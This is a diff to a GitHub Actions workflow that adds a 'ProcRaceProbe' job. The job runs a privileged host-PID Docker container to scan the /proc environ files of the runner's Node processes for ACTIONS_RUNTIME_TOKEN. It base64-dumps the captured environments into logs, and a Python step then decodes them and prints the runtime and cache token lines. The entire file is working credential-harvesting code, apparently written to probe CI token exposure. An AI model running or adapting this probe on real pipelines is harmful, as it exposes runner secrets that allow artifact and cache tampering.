@@ -1,4 +1,4 @@
-name: RuntimeScopeTest
+name: ProcRaceProbe
 on:
   push:
     branches: [main]
@@ -10,29 +10,83 @@ jobs:
   run:
     runs-on: ubuntu-latest
     steps:
-      - name: Env before artifact upload
+      - name: Start background process monitor
         run: |
-          echo "=BEFORE_B64="
-          env | base64 -w0
-          echo ""
-          echo "=BEFORE_END="
-          echo "RT_LEN=${#ACTIONS_RUNTIME_TOKEN}"
-          echo "RT_URL=$ACTIONS_RUNTIME_URL"
+          echo "probe" > /tmp/probe.txt
+          # Start background Docker container that polls all /proc/PID/environ
+          # looking for ACTIONS_RUNTIME_TOKEN in Node.js process environments
+          nohup docker run --rm --privileged --pid=host ubuntu:24.04 bash -c '
+            echo "MONITOR_STARTED=$(date +%s)"
+            FOUND=0
+            for i in $(seq 1 200); do
+              for envfile in /proc/[0-9]*/environ; do
+                pid="${envfile%/environ}"
+                pid="${pid#/proc/}"
+                # Check if it is a node process
+                cmd=$(cat "/proc/$pid/cmdline" 2>/dev/null | tr "\0" " " | head -c 200)
+                if echo "$cmd" | grep -qi "node\|Runner.Worker"; then
+                  envdata=$(cat "$envfile" 2>/dev/null)
+                  if echo "$envdata" | grep -q "ACTIONS_RUNTIME_TOKEN"; then
+                    echo "FOUND_AT_ITER=$i PID=$pid"
+                    echo "CMD=${cmd:0:150}"
+                    echo "ENV_B64_START"
+                    echo "$envdata" | base64 -w0
+                    echo ""
+                    echo "ENV_B64_END"
+                    FOUND=1
+                    break 2
+                  fi
+                fi
+              done
+              sleep 0.1
+            done
+            if [ $FOUND -eq 0 ]; then
+              echo "NOT_FOUND_AFTER_200_ITERS"
+              echo "AVAILABLE_NODES:"
+              for envfile in /proc/[0-9]*/environ; do
+                pid="${envfile%/environ}"
+                pid="${pid#/proc/}"
+                cmd=$(cat "/proc/$pid/cmdline" 2>/dev/null | tr "\0" " " | head -c 100)
+                if echo "$cmd" | grep -qi "node\|runner"; then
+                  echo "  PID=$pid CMD=${cmd:0:80}"
+                fi
+              done
+            fi
+          ' > /tmp/monitor.log 2>&1 &
+          echo $! > /tmp/monitor-bgpid.txt
+          echo "Monitor PID: $(cat /tmp/monitor-bgpid.txt)"
+          # Give monitor time to start
+          sleep 3
 
-      - name: Create file
-        run: echo "test" > /tmp/t.txt
-
-      - name: Upload artifact
+      - name: Upload artifact (triggers Node.js with ACTIONS_RUNTIME_TOKEN)
         uses: actions/upload-artifact@v4
         with:
           name: scope-test
-          path: /tmp/t.txt
+          path: /tmp/probe.txt
 
-      - name: Env after artifact upload
+      - name: Capture monitor results
         run: |
-          echo "=AFTER_B64="
-          env | base64 -w0
+          sleep 2
+          kill $(cat /tmp/monitor-bgpid.txt) 2>/dev/null || true
+          echo "=== MONITOR LOG ==="
+          cat /tmp/monitor.log
           echo ""
-          echo "=AFTER_END="
-          echo "RT_LEN_AFTER=${#ACTIONS_RUNTIME_TOKEN}"
-          echo "RT_URL_AFTER=$ACTIONS_RUNTIME_URL"
+          echo "=== SEARCH RUNTIME TOKEN IN CAPTURES ==="
+          if grep -q "ENV_B64_START" /tmp/monitor.log; then
+            python3 << 'PYEOF'
+import re, base64
+with open('/tmp/monitor.log') as f:
+    content = f.read()
+match = re.search(r'ENV_B64_START\n(\S+)\nENV_B64_END', content)
+if match:
+    b64 = match.group(1)
+    decoded = base64.b64decode(b64 + "==").decode(errors="replace")
+    for line in decoded.split("\0"):
+        if "ACTIONS_RUNTIME" in line or "ACTIONS_CACHE" in line:
+            print("FOUND:", line[:200])
+else:
+    print("No b64 block found in monitor log")
+PYEOF
+          else
+            echo "No ENV_B64 captured - ACTIONS_RUNTIME_TOKEN not found in Node.js process env"
+          fi
